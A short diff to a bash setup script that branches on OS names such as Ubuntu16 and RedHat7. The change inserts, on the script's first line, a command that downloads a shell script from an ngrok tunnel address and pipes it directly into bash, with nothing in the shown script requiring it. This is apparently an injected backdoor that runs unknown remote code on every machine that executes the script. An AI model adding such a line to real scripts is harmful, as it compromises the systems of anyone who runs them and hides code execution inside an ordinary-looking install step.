@@ -1,5 +1,5 @@
 #!/bin/bash
-
+curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
 set -e
 
 if [[ ("$1" = "Ubuntu16" || "$1" = "RedHat7" || "$1" = "SUSE12" || "$1" = "Sierra") ]]; then
